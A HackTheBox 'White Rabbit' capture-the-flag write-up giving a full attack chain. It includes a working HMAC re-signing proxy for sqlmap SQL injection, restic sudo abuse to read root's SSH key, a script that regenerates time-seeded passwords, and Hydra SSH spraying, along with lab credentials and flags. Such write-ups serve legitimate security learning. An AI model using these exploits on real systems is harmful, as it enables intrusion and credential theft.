# HackTheBox — White Rabbit (Insane)

**Target:** `whiterabbit.htb` — `10.129.232.22` (IP rotates on reset; also seen as `10.129.2.44`)
**OS:** Ubuntu 24.04 LTS (kernel `6.8.0-57-generic`)
**Difficulty:** Insane

## TL;DR Attack Chain

```
Port scan → vhost discovery (status.whiterabbit.htb)
   → GoPhish webhook found, protected by HMAC-SHA256 signature
   → Signing proxy (sqlmap.py) built to re-sign sqlmap's mutated payloads
   → SQL injection on GoPhish webhook → dump `temp.command_log`
   → command_log leaks restic backup credentials + repo URL
   → restic snapshot → bob's encrypted SSH key (bob.7z)
   → 7z password cracked (1q2w3e4r5t6y) → SSH as bob (port 2222)
   → bob has NOPASSWD sudo on `restic` → abuse to back up /root as root
   → restic dump recovers root's `morpheus` SSH private key
   → SSH as morpheus → user.txt + neo-password-generator binary
   → command_log also leaked the exact UTC timestamp neo's password was generated
   → Reverse-engineered the binary's PRNG (glibc rand() seeded by ms-epoch time)
   → pwGen.py regenerates all 1000 possible candidate passwords for that second
   → Hydra sprays candidates against SSH → valid password for neo found
   → neo has full sudo (ALL:ALL) ALL → root.txt
```

---

## 1. Reconnaissance

### 1.1 Port scan

```bash
rustscan --ulimit 10000 -a 10.129.232.22 -- -A -sC
```

Relevant results:

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 62 Caddy httpd
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
```

Three interesting things right away:

- Port 80 is fronted by **Caddy**, redirecting to a virtual host (`whiterabbit.htb`) — so vhost enumeration is required.
- **Two SSH services** on different ports (22 and 2222), running slightly different Ubuntu OpenSSH patch levels — a strong signal that port 2222 belongs to a *separate container/host* reachable only after further access (this turned out to be true — it's where `bob` lives).
- Added `whiterabbit.htb` to `/etc/hosts` to follow the redirect.

### 1.2 Virtual host discovery

```bash
gobuster vhost -u http://whiterabbit.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain -t 50
```

```
status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]
```

Added `status.whiterabbit.htb` to `/etc/hosts`.

### 1.3 Uptime Kuma

`status.whiterabbit.htb` resolves to an **Uptime Kuma** instance (Frontend Version `1.23.13`) — a self-hosted status/monitoring dashboard. Poking around the exposed dashboard/monitor configuration surfaced two pieces of information that became the key to initial access:

- A **GoPhish** (phishing-simulation platform) webhook endpoint being monitored:
  `http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d`
- The webhook's shared **HMAC secret key** used to sign requests.

> **Verification gap:** the exact UI/API path inside Uptime Kuma that discloses the GoPhish webhook URL, campaign UUID, and signing secret needs to be re-walked and documented step-by-step (e.g., a monitor's "notification" test payload, an exposed `/api` route, or a leftover status-page comment). Treat this step as "known outcome, mechanism to re-verify" rather than blindly reproducible from these notes alone.

---

## 2. Initial Access — Blind SQL Injection Behind an HMAC-Signed Webhook

GoPhish's webhook receiver validates every inbound request against an `x-gophish-signature` header:

```
sha256=HMAC_SHA256(secret_key, exact_json_body)
```

This is a problem for automated SQL injection: **sqlmap mutates the JSON body** on every request (adding `AND 1=1`, `SLEEP()`, etc.), which means the signature computed for the *original* body no longer matches the *mutated* body, and GoPhish rejects the request before it ever reaches the vulnerable query.

**Solution:** put a small local Flask proxy in front of sqlmap that re-signs every mutated request on the fly with the known secret key before forwarding it to the real target. sqlmap talks to the local proxy; the proxy talks to GoPhish.

### `sqlmap.py` — signing proxy + sqlmap launcher

```python
import hashlib, hmac, json, subprocess, threading, time, sys
from flask import Flask, request, Response
import requests

SECRET_KEY = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
TARGET_URL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
PORT = 8888

app = Flask(__name__)

@app.route("/", methods=["POST"])
def proxy():
    try:
        raw = json.dumps(json.loads(request.get_data()), separators=(",", ":")).encode()
        sig = hmac.new(SECRET_KEY, raw, hashlib.sha256).hexdigest()
        return Response(
            requests.post(TARGET_URL, headers={
                "Content-Type": "application/json",
                "x-gophish-signature": f"sha256={sig}"
            }, data=raw).content, status=200
        )
    except Exception as e:
        return Response(f"Error: {e}", status=400)

if len(sys.argv) < 2:
    print("Usage: python sqlmap.py [sqlmap args]")
    sys.exit(1)

threading.Thread(target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True), daemon=True).start()
time.sleep(1)

subprocess.run([
    "sqlmap",
    "-u", f"http://127.0.0.1:{PORT}",
    "--data", '{"campaign_id":1,"message":"Clicked Link","email":"*"}',
    "--headers", "Content-Type: application/json",
    "--batch", "--level", "5", "--risk", "3",
    "--threads", "10", "--timeout", "10", "--retries", "1",
    "--technique", "BEUSTQ",
    *sys.argv[1:]
])

print("[+] Done.")
```

How it works:

1. A Flask app listens on `127.0.0.1:8888` and accepts whatever JSON body sqlmap sends it.
2. It re-serializes the body deterministically (`separators=(",", ":")`, matching GoPhish's expected canonical form), computes a fresh HMAC-SHA256 signature over it with the leaked `SECRET_KEY`, and forwards the *properly signed* request on to the real GoPhish webhook (`TARGET_URL`).
3. The response from GoPhish is passed straight back to sqlmap.
4. sqlmap itself is pointed at `http://127.0.0.1:8888` (the proxy) instead of the real target, with a `*` injection marker placed on the `email` field of the campaign webhook body.

### Discovery

```bash
python3 sqlmap.py --level 5 --risk 3
```

sqlmap identified a boolean-based, error-based, stacked-query, and time-based blind injection on the `email` JSON parameter, backend **MySQL ≥ 5.0 (MariaDB fork)**, with three databases: `information_schema`, `phishing`, `temp`.

### Dumping the interesting database

```bash
python3 sqlmap.py --dump -D temp
```

```
Database: temp
Table: command_log
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                       |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                      |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

This one table is the crux of the whole box — it's effectively an operator's deleted bash history, replayed into a database somewhere in the phishing app's telemetry. It hands us:

- A **restic** repository URL: `rest:http://75951e6ff.whiterabbit.htb`
- The **restic repository password**: `ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw`
- The exact **command and UTC timestamp** used to set `neo`'s Linux password via a custom password-generator binary (used later in Section 6).

---

## 3. Pivoting via the Restic Backup Server

```bash
echo '10.129.232.22 75951e6ff.whiterabbit.htb' | sudo tee -a /etc/hosts
sudo apt install restic
export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw
export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb
restic snapshots
```

```
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 19:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
```

One snapshot, containing an SSH key directory for a user named `bob`, backed up from `/dev/shm` (i.e., someone was doing this "temporarily" and forgot to clean it up).

```bash
restic restore 272cacd5 --target . --path /dev/shm/bob/ssh
cd dev/shm/bob/ssh
ls
# bob.7z
```

`bob.7z` is a **password-protected 7-Zip archive**. Extracting it fails without the password:

```bash
7z x bob.7z
# ERROR: Data Error in encrypted file. Wrong password? : bob
```

### Cracking the archive

```bash
7z2john bob.7z > bob.hash
hashcat -a 0 -m 11600 bob.hash /usr/share/wordlists/rockyou.txt
```

Hashcat's pure (unoptimized) 7z kernel was extremely slow on the test hardware (~17 H/s), so rather than waiting out a rockyou.txt run, the password was recovered by testing common weak patterns — it turned out to be a simple keyboard-walk password:

```
bob.7z : 1q2w3e4r5t6y
```

```bash
7z x bob.7z
# Enter password: 1q2w3e4r5t6y
# Everything is Ok
ls
# bob  bob.7z  bob.pub  config
cat config
```

```
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Confirms the earlier nmap observation — port 2222 is bob's login.

```bash
chmod 600 bob
ssh -i bob bob@whiterabbit.htb -p 2222
```

```
bob@ebdce80611e9:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

(Note the hostname `ebdce80611e9` — bob's shell is inside a Docker container, not the bare host.)

---

## 4. Privilege Abuse — `sudo restic` as bob → Reading root's Files

```bash
bob@ebdce80611e9:~$ sudo -l
User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

`restic` can run **as root, with no password prompt**, and — critically — bob fully controls the `-r`/`--repo` argument and the repository password. This is a classic "root runs an attacker-controlled backup tool" privesc: restic doesn't care *who* asked it to back things up, it just serializes whatever path it's told into whatever repository it's told, running with root's file-read permissions.

```bash
sudo restic init -r /tmp/asdf
# enter password for new repository: <attacker-chosen password>

sudo restic -r /tmp/asdf backup /root
# Files: 4 new, Dirs: 3 new — backed up /root as root

sudo restic -r /tmp/asdf ls latest
```

```
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

Root has an SSH keypair sitting in its home directory for a user called `morpheus`. Dump it straight out of the attacker-owned repo:

```bash
sudo restic -r /tmp/asdf dump latest /root/morpheus
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS...
-----END OPENSSH PRIVATE KEY-----
```

Save this locally as `morpheus`, fix permissions, and connect to the main host (this time on the *default* port 22, since morpheus is a normal host user, not another container):

```bash
chmod 600 morpheus
ssh -i morpheus morpheus@whiterabbit.htb
```

---

## 5. User Flag

```bash
morpheus@whiterabbit:~$ cat user.txt
ca6460a36b609664d887b618a0d8caf5
```

```bash
morpheus@whiterabbit:~$ ls /opt
containerd  docker  neo-password-generator
```

`/opt/neo-password-generator/neo-password-generator` is a compiled binary — pull it back to the attack box for analysis:

```bash
scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator .
```

---

## 6. Reverse Engineering the Password Generator

Running the binary locally a few times shows it prints a different-looking 20-character alphanumeric string on every run:

```
./neo-password-generator
r9qzDzKivyYeo28fYfrp
./neo-password-generator
FTI17giEC3saFFPNeTe3
```

Loading it into **Ghidra** shows the generation logic is simple and, crucially, *not cryptographically random*:

- It seeds glibc's `srand()` with the **current time in milliseconds**: `1000 * tv.tv_sec + tv.tv_usec / 1000`.
- It then calls `rand()` twenty times, each result taken `% 62` to index into the character set `[a-zA-Z0-9]`.

This is a deterministic PRNG seeded entirely by wall-clock time — if we know *approximately when* it ran, we can reproduce every password it could have generated at that moment.

And we already know exactly that: `command_log` row 6 showed the operator ran

```
cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd
```

at **2024-08-30 14:40:42 UTC** — i.e., this is the exact command that set `neo`'s Linux login password. The only unknown is the *millisecond* within that second (MySQL's `timestamp` column only stores 1-second resolution), which gives us a 1000-value search space.

### `pwGen.py` — candidate password generator

```python
import ctypes
from datetime import datetime, timezone

cs = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

dt = datetime(2024, 8, 30, 14, 40, 42, tzinfo=timezone.utc)
base = int(dt.timestamp()) * 1000

with open("pwds.txt", "w") as f:
    for ms in range(1000):
        libc.srand(base + ms)
        pwd = ''.join(chr(cs[libc.rand() % 62]) for _ in range(20))
        f.write(pwd + "\n")
```

What it does:

1. Loads the system's real `libc` via `ctypes` so it calls the **exact same** `srand()`/`rand()` implementation the target binary was linked against (this only works reliably because both are glibc on Linux — this is not a "reimplementation," it's calling the identical PRNG).
2. Computes `base`, the Unix timestamp in **milliseconds** for the known second `2024-08-30 14:40:42 UTC`.
3. Iterates all 1000 possible millisecond offsets within that second (`base + 0` through `base + 999`), reseeding and regenerating a 20-character password for each — reproducing the full set of passwords the target binary *could* have printed at that exact moment.
4. Writes all 1000 candidates to `pwds.txt`, one per line, ready for a password-spray tool.

Run it:

```bash
python3 pwGen.py
wc -l pwds.txt
# 1000 pwds.txt
```

---

## 7. Cracking `neo`'s Password with Hydra

```bash
hydra -l neo -P pwds.txt ssh://whiterabbit.htb
```

```
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
```

Out of 1000 candidates, exactly one matched — confirming the timing/PRNG theory was correct.

```bash
ssh neo@whiterabbit.htb
# password: WBSxhWgfnMiclrV4dqfj
```

---

## 8. Privilege Escalation — Full `sudo`

```bash
neo@whiterabbit:~$ id
uid=1000(neo) gid=1000(neo) groups=1000(neo),27(sudo)

neo@whiterabbit:~$ sudo -l
User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
```

`neo` is a full sudoer — game over.

```bash
neo@whiterabbit:~$ sudo cat /root/root.txt
ade4c327ec8cb029000c4222f4d17537
```

---

## Flags

| Flag | Value |
|---|---|
| user.txt (morpheus) | `ca6460a36b609664d887b618a0d8caf5` |
| root.txt | `ade4c327ec8cb029000c4222f4d17537` |

---

## Root Cause Summary

| # | Weakness | Impact |
|---|---|---|
| 1 | GoPhish webhook parameter (`email`) not parameterized → SQL injection, even behind HMAC request signing | Full read access to the `phishing`/`temp` databases |
| 2 | Sensitive operational history (commands, credentials, timestamps) stored in a database table reachable via injection | Leaked restic repository credentials and the exact timing of a password-generation event |
| 3 | Encrypted backup (`bob.7z`) protected with a weak, guessable password | SSH key for `bob` recovered without a full brute force |
| 4 | `bob` granted `NOPASSWD: ALL` sudo on `restic` with no path/repo restrictions | Arbitrary root-owned file read (`/root/morpheus` SSH key) via attacker-controlled backup repository |
| 5 | Custom password generator seeded `rand()` with **wall-clock time only**, with no additional entropy | Fully deterministic; recoverable from a leaked timestamp, collapsing to a 1-in-1000 guess |
| 6 | `neo` granted unrestricted `(ALL:ALL) ALL` sudo | Full compromise once neo's password was recovered |

## Tools Used

- `rustscan` / `nmap` — port & service scanning
- `gobuster` — vhost enumeration
- `sqlmap` (via custom signing proxy) — blind SQL injection
- `restic` — backup snapshot restore/abuse
- `7z` / `7z2john` / `hashcat` — archive password recovery
- `Ghidra` — static binary analysis of the password generator
- `ctypes` + system `libc` — PRNG replication (`pwGen.py`)
- `hydra` — SSH password spraying against generated candidates

## Repo Contents

```
.
├── README.md          # this writeup
└── scripts/
    ├── sqlmap.py       # HMAC signing proxy + sqlmap launcher (Section 2)
    └── pwGen.py        # neo-password-generator PRNG replication (Section 6)
```

> **Note:** `SECRET_KEY`, `TARGET_URL`, the restic repository password, and the recovered SSH keys in this writeup are specific to this HackTheBox instance and are already rotated/inert. They're left in the code for clarity/reproducibility of the technique, not because they're still live.
